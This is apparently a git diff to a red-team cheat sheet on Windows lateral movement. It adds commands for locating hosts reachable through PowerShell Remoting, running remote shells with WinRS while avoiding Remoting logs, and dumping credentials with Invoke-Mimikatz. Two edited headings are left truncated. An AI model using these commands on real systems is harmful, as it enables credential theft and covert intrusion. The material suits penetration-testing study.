@@ -3,7 +3,12 @@
 
 ### PowerShell Remoting
 ---
-Uses TCP-5985
+Uses TCP-5985. T
+```powershell
+# Check computers where PS Remoting can be used
+C:> . .\Find-PSRemotingLocalAdminAccess.ps1
+C:> Find-PSRemotingLocalAdminAccess
+```
 
 - **Enable PowerShell Remoting:** From [M$ Documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2), creates rules on computer firewall to allow remote connections. 
 ```powershell
@@ -29,7 +34,7 @@ C:> Enter-PSSession -ComputerName <computer>
 C:> $remote_computer = New-PSSesion -ComputerName <computer>
 C:> Enter-PSSession -Session $remote_computer
 ```
-- **Remote Execution**
+- **Rem
 ```powershell
 # Remote Execution With Credentials
 c:> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
@@ -53,3 +58,26 @@ C:> Invoke-Command -Session $s -ScriptBlock {$p.VirtualMemorySize}          # $s
 
 ### WinRS
 ---
+```powershell
+# Check computers where WinRS can be used
+C:> . .\Find-PSRemotingLocalAdminAccess.ps1
+C:> Find-PSRemotingLocalAdminAccess
+```
+Uses same port as PSRemoting, and evades Remoting Logging.
+- Execute Remote Command
+```powershell
+# USe `cmd`as command to get a shell
+C:> winrs -remote:<computer> -u:<domain>\<user> -p:<password> <command>
+```
+
+### MimiKatz PowerShell Port
+---
+Requires Local Admin Privileges on computer where is run.
+```powershell
+C:> . .\Invoke-Mimikatz.ps1
+```
+- Dump Credentials on Local Machine
+
+```powershell
+C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
